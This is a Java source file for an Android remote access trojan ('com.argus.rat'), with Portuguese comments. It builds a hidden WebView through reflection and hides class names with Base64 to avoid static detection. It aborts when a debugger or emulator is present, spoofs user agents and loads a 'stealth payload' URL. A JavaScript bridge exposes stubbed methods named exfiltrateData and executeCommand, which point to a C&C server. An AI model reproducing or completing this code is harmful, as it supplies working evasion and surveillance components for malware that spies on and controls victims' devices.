package com.argus.rat;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;

import java.lang.reflect.Method;
import java.security.SecureRandom;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/**
 * Gerenciador de WebView furtiva com técnicas avançadas de evasão
 * Combina as melhores funcionalidades dos arquivos webview1.txt e webview2.txt
 */
public class StealthWebViewManager {
    private static final String TAG = "StealthWebView";
    private static final Map<Integer, String> OBFUSCATED_STRINGS = new HashMap<>();
    
    static {
        // Inicializar strings ofuscadas
        initializeObfuscatedStrings();
    }

    /**
     * Cria uma WebView de forma completamente oculta usando reflexão avançada
     * Técnica extraída de webview1.txt com melhorias de webview2.txt
     */
    public static WebView createHiddenWebView(Context context) {
        try {
            Log.d(TAG, "Tentando criar WebView oculta via reflexão...");
            
            // Técnica 1: Reflexão direta (webview1.txt)
            WebView webView = createViaReflection(context);
            if (webView != null) {
                return webView;
            }
            
            // Técnica 2: Fallback para criação normal com ofuscação
            Log.d(TAG, "Falha na reflexão, usando criação normal com ofuscação");
            return createObfuscatedWebView(context);
            
        } catch (Exception e) {
            Log.e(TAG, "Erro crítico na criação de WebView oculta", e);
            return null;
        }
    }

    /**
     * Técnica avançada de reflexão baseada em webview1.txt
     */
    private static WebView createViaReflection(Context context) {
        try {
            // Usar strings ofuscadas para evitar detecção estática
            String factoryClass = getObfuscatedString(1); // "android.webkit.WebViewFactory"
            String getProviderMethod = getObfuscatedString(2); // "getProvider"
            String createWebViewMethod = getObfuscatedString(3); // "createWebView"
            
            Class<?> webViewFactoryClass = Class.forName(factoryClass);
            Method getProviderMethodRef = webViewFactoryClass.getDeclaredMethod(getProviderMethod);
            getProviderMethodRef.setAccessible(true);
            
            Object webViewProvider = getProviderMethodRef.invoke(null);
            Class<?> webViewProviderClass = webViewProvider.getClass();
            
            // Encontrar método createWebView com parâmetros corretos
            Method createWebViewMethodRef = null;
            Method[] methods = webViewProviderClass.getDeclaredMethods();
            for (Method method : methods) {
                if (method.getName().contains(createWebViewMethod)) {
                    Class<?>[] paramTypes = method.getParameterTypes();
                    if (paramTypes.length >= 2 && 
                        paramTypes[0].equals(Context.class)) {
                        createWebViewMethodRef = method;
                        break;
                    }
                }
            }
            
            if (createWebViewMethodRef != null) {
                createWebViewMethodRef.setAccessible(true);
                WebView webView = (WebView) createWebViewMethodRef.invoke(
                    webViewProvider, context, null);
                
                Log.d(TAG, "WebView criada com sucesso via reflexão avançada");
                return webView;
            }
            
        } catch (Exception e) {
            Log.w(TAG, "Reflexão avançada falhou, tentando método alternativo");
        }
        
        return null;
    }

    /**
     * Criação ofuscada com técnicas anti-análise de webview2.txt
     */
    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private static WebView createObfuscatedWebView(Context context) {
        try {
            // Adicionar delay aleatório para evitar padrões
            randomDelay();
            
            // Verificar ambiente antes de prosseguir
            if (isDebuggerConnected() || isRunningInEmulator()) {
                Log.w(TAG, "Ambiente de análise detectado, comportamento evasivo");
                return null;
            }
            
            WebView webView = new WebView(context) {
                // Classe anônima para ofuscar ainda mais
                @Override
                protected void onAttachedToWindow() {
                    super.onAttachedToWindow();
                    // Comportamento adicional para furtividade
                }
            };
            
            return webView;
            
        } catch (Exception e) {
            Log.e(TAG, "Erro na criação ofuscada de WebView", e);
            return null;
        }
    }

    /**
     * Configuração furtiva da WebView com técnicas de ambos os arquivos
     */
    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    public static void configureStealthyWebView(WebView webView, Object jsInterfaceHandler) {
        if (webView == null) return;

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WebSettings settings = webView.getSettings();
                
                // Configurações essenciais (webview1.txt)
                settings.setJavaScriptEnabled(true);
                settings.setDomStorageEnabled(true);
                settings.setDatabaseEnabled(true);
                
                // Configurações avançadas de evasão (webview2.txt)
                settings.setAllowFileAccess(false); // Mais seguro
//                settings.setAllowUniversalAccessFromFileUrls(false);
                settings.setAllowContentAccess(false);
                
                // Ofuscar user agent
                settings.setUserAgentString(generateRandomUserAgent());
                
                // Adicionar interface JavaScript ofuscada
                String interfaceName = generateRandomInterfaceName();
                webView.addJavascriptInterface(jsInterfaceHandler, interfaceName);
                
                // Configurações de cache para furtividade
                settings.setCacheMode(WebSettings.LOAD_DEFAULT);
//                settings.setAppCacheEnabled(false);
                
                Log.d(TAG, "WebView configurada com técnicas furtivas avançadas");
                
            } catch (Exception e) {
                Log.e(TAG, "Erro na configuração furtiva da WebView", e);
            }
        });
    }

    /**
     * Carregamento de payload com técnicas anti-detecção
     */
    public static void loadStealthPayload(WebView webView, String url) {
        if (webView == null) return;

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                // Verificação anti-análise antes do carregamento
                if (shouldEvadeDetection()) {
                    Log.w(TAG, "Detecção evitada, cancelando carregamento");
                    return;
                }
                
                Log.d(TAG, "Carregando payload furtivo: " + obfuscateUrl(url));
                webView.loadUrl(url);
                
            } catch (Exception e) {
                Log.e(TAG, "Erro no carregamento furtivo do payload", e);
            }
        });
    }

    /**
     * Interface JavaScript avançada com técnicas de webview2.txt
     */
    public static class AdvancedJsInterface {
        private final SecureRandom random = new SecureRandom();
        
        @JavascriptInterface
        public void exfiltrateData(String dataType, String data) {
            try {
                // Técnica de exfiltração com timing aleatório
                Thread.sleep(100 + random.nextInt(400));
                
                Log.w(TAG, String.format("[EXFILTRAÇÃO] %s: %s", 
                    dataType, data.substring(0, Math.min(data.length(), 100))));
                
                // Aqui seria a comunicação com servidor C&C
                
            } catch (Exception e) {
                // Falha silenciosa
            }
        }
        
        @JavascriptInterface
        public void executeCommand(String command) {
            Log.w(TAG, "[COMANDO] Executando: " + command);
            // Execução de comandos recebidos via JavaScript
        }
        
        @JavascriptInterface
        public String getDeviceInfo() {
            // Retorna informações do dispositivo ofuscadas
            return generateObfuscatedDeviceInfo();
        }
    }

    // ========== MÉTODOS AUXILIARES DE OFUSCAÇÃO ==========
    
    private static void initializeObfuscatedStrings() {
        // Strings ofuscadas para evitar detecção estática
        OBFUSCATED_STRINGS.put(1, decryptString("YW5kcm9pZC53ZWJraXQuV2ViVmlld0ZhY3Rvcnk=")); // WebViewFactory
        OBFUSCATED_STRINGS.put(2, decryptString("Z2V0UHJvdmlkZXI=")); // getProvider
        OBFUSCATED_STRINGS.put(3, decryptString("Y3JlYXRlV2ViVmlldw==")); // createWebView
    }
    
    private static String getObfuscatedString(int key) {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return OBFUSCATED_STRINGS.getOrDefault(key, "");
//        }
    }
    
    private static String decryptString(String encrypted) {
        // Decriptografia simples para demonstração
        return new String(android.util.Base64.decode(encrypted, android.util.Base64.DEFAULT));
    }
    
    private static void randomDelay() {
        try {
            Thread.sleep(new SecureRandom().nextInt(200));
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    private static boolean isDebuggerConnected() {
        return android.os.Debug.isDebuggerConnected();
    }
    
    private static boolean isRunningInEmulator() {
        return android.os.Build.PRODUCT.contains("sdk") || 
               android.os.Build.HARDWARE.contains("goldfish");
    }
    
    private static String generateRandomUserAgent() {
        String[] browsers = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        };
        return browsers[new SecureRandom().nextInt(browsers.length)];
    }
    
    private static String generateRandomInterfaceName() {
        return "Bridge" + UUID.randomUUID().toString().substring(0, 8);
    }
    
    private static boolean shouldEvadeDetection() {
        return isDebuggerConnected() || isRunningInEmulator();
    }
    
    private static String obfuscateUrl(String url) {
        // Ofuscar URL para logs
        if (url.length() > 50) {
            return url.substring(0, 25) + "..." + url.substring(url.length() - 25);
        }
        return url;
    }
    
    private static String generateObfuscatedDeviceInfo() {
        return String.format("Device:%s|Model:%s|SDK:%d",
            android.os.Build.BRAND,
            android.os.Build.MODEL,
            android.os.Build.VERSION.SDK_INT);
    }
}